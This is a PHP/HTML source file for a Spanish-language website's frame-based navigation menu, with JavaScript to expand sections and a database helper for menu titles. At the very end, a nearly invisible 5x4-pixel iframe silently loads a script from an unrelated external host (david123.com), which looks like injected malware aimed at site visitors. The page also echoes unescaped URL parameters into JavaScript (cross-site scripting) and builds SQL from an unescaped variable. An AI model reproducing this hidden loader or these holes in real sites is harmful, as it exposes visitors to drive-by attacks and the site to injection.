<?
	define ('authenticate', false);
	require ('../inc/conf.inc.php');
	$socio=$_SESSION['socio'];

if($socio=='mdt'){ $anchof=93;} else{ $anchof=110; }

?>
<HTML>
<HEAD><TITLE>areas</TITLE>
<link href="../estilos<?=$_SESSION['socio']?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
<?
if(isset($_GET['actualiza'])){ 
	echo "var actualiza=".$_GET['actualiza'].";\n"; 
	echo "var tit='".$_GET['tit']."'\n"; 
	echo "var sec='".$_GET['sec']."'\n"; 
}
?>

function botonover(x) {
x.childNodes[0].childNodes[0].src=bullet2.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1over'
}

function botonout(x) {
x.childNodes[0].childNodes[0].src=bullet1.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1'
}
function xhola(s,x,t){
	cierratodo();
	cambiar(s,x,t);
}
function cambiarsub(item,cod,t) {
	parent.frames['centro'].location='<?=CFG_virtualPath?>carga_contenido.php?id_sel='+cod+'&tit='+t
	parent.frames['derecha'].location='<?=CFG_virtualPath?>carga_derecha.php?id_sel=3&menu=1&id_sub_sel='+cod;

}
function cambiar(item,cod,t) {
	if(item){
	   obj=document.getElementById(item);
	   visible=(obj.style.display!="none")
	   key=document.getElementById("x" + item);
	   if (visible) {
	     obj.style.display="none";
	   } else {
	      obj.style.display="block";
	   }
	}
	if(cod>0){
		//'+cod+'
		parent.frames['centro'].location='<?=CFG_virtualPath?>carga_contenido.php?id_sel='+cod+'&tit='+t
		parent.frames['derecha'].location='<?=CFG_virtualPath?>carga_derecha.php?id_sel=3&menu=1&id_sub_sel='+cod;
	}
}

function abretodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="block";
     key=document.getElementById("x" + divs[i].id);
     key.innerHTML="<img src='textfolder.gif' width='16' height='16' hspace='0' vspace='0' border='0'>";
   }
}

function cierratodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="none";
     //key=document.getElementById("x" + divs[i].id);
     //key.innerHTML="<img src='folder.gif' width='16' height='16' hspace='0' vspace='0' border='0'>";
   }
}

</script>
</HEAD>
<BODY>

<input type="hidden" name="id" value="3">
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor" height="19"><small><small>&nbsp;</small></small></td>
  </tr>
</table>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td >

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xuno" href="javascript:cierratodo();cambiar('uno',9,'<?=traducemenu(9)?>');"><?=traducemenu(9)?></a></td>
  </tr>
</table>
<div id="uno" style="display: none; margin-left: 0em;">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',27,'<?=traducemenu(27)?>');"><?=traducemenu(27)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',28,'<?=traducemenu(28)?>');"><?=traducemenu(28)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',29,'<?=traducemenu(29)?>');"><?=traducemenu(29)?></a></td>
    </tr>
  </table>
</div>


<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xdos" href="javascript:cierratodo();cambiar('',30,'<?=traducemenu(30)?>');"><?=traducemenu(30)?></a></td>
  </tr>
</table>
<!--<div id="dos" style="display: none; margin-left: 0em; width:100%">
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',33,'<?=traducemenu(33)?>');"><?=traducemenu(33)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='0'></td>
      <td><a class="link2" href="javascript:cambiarsub('',31,'<?=traducemenu(31)?>');"><?=traducemenu(31)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='0'></td>
      <td><a class="link2" href="javascript:cambiarsub('',32,'<?=traducemenu(32)?>');"><?=traducemenu(32)?></a></td>
    </tr>
  </table>
</div>-->

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a  class="link1" id="xtres" href="javascript:cierratodo();cambiar('tres',11,'<?=traducemenu(11)?>');"><?=traducemenu(11)?></a></td>
  </tr>
</table>
<div id="tres" style="display: none; margin-left: 0em;">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr valign="top">
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',35,'<?=traducemenu(35)?>');"><?=traducemenu(35)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr valign="top">
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',36,'<?=traducemenu(36)?>');"><?=traducemenu(36)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr valign="top">
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',37,'<?=traducemenu(37)?>');"><?=traducemenu(37)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr valign="top">
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',38,'<?=traducemenu(38)?>');"><?=traducemenu(38)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',39,'<?=traducemenu(39)?>');"><?=traducemenu(39)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr valign="top">
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',40,'<?=traducemenu(40)?>');"><?=traducemenu(40)?></a></td>
    </tr>
  </table>
<!--  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',160,'<?=traducemenu(160)?>');"><?=traducemenu(160)?></a></td>
    </tr>
  </table>-->
</div>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xcuatro" href="javascript:cierratodo();cambiar('cuatro',12,'<?=traducemenu(12)?>');"><?=traducemenu(12)?></a></td>
  </tr>
</table>
<div class="divisor" id="cuatro" style="display: none;">
 <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',206,'<?=traducemenu(206)?>');"><?=traducemenu(206)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',207,'<?=traducemenu(207)?>');"><?=traducemenu(207)?></a></td>
    </tr>
  </table>
</div>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xcinco" href="javascript:cierratodo();cambiar('cinco',13,'<?=traducemenu(13)?>');"><?=traducemenu(13)?></a></td>
  </tr>
</table>
<div id="cinco" style="display: none;">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',70,'<?=traducemenu(70)?>');"><?=traducemenu(70)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',75,'<?=traducemenu(75)?>');"><?=traducemenu(75)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',76,'<?=traducemenu(76)?>');"><?=traducemenu(76)?></a></td>
    </tr>
  </table>

  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',77,'<?=traducemenu(77)?>');"><?=traducemenu(77)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',165,'<?=traducemenu(165)?>');"><?=traducemenu(165)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',166,'<?=traducemenu(166)?>');"><?=traducemenu(166)?></a></td>
    </tr>
  </table>
 <!-- <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',167,'<?=traducemenu(167)?>');"><?=traducemenu(167)?></a></td>
    </tr>
  </table>-->

</div>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xseis" href="javascript:cierratodo();cambiar('seis',14,'<?=traducemenu(14)?>');"><?=traducemenu(14)?></a></td>
  </tr>
</table>
<div id="seis" style="display: none; margin-left: 0em; ">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',79,'<?=traducemenu(79)?>');"><?=traducemenu(79)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',80,'<?=traducemenu(80)?>');"><?=traducemenu(80)?></a></td>
    </tr>
  </table>
</div>


<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xsiete" href="javascript:cierratodo();cambiar('siete',15,'<?=traducemenu(15)?>');"><?=traducemenu(15)?></a></td>
  </tr>
</table>
<div id="siete" style="display: none; margin-left: 0em;">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',82,'<?=traducemenu(82)?>');"><?=traducemenu(82)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',83,'<?=traducemenu(83)?>');"><?=traducemenu(83)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',84,'<?=traducemenu(84)?>');"><?=traducemenu(84)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',85,'<?=traducemenu(85)?>');"><?=traducemenu(85)?></a></td>
    </tr>
  </table>
 <!-- <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',86,'<?=traducemenu(86)?>');"><?=traducemenu(86)?></a></td>
    </tr>
  </table>-->

</div>

</td></tr></table>

<script>
parent.document.all('marcos').cols="200,*,<?=$anchof?>"
parent.frames['centro'].location='../carga_contenido.php?id_sel=3&tit=<?=traducemenu(3)?>';
parent.frames['derecha'].location='../carga_derecha.php?id_sel=3&menu=1';
try{
	if(actualiza>0){
		xhola(sec,actualiza,tit);
	}
}
catch(f){}


</script>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>

<?
function traducemenu($id){
	global $lng;
	$db1=new DBI();
	$db1->select('secciones','*',"id=$id and lng='$lng'");
	if($db1->num_rows()>0){
		$row=$db1->fetch_object();
		echo $row->titulo;
	}
	else{
		echo "no hay datos";
	}

}
?>
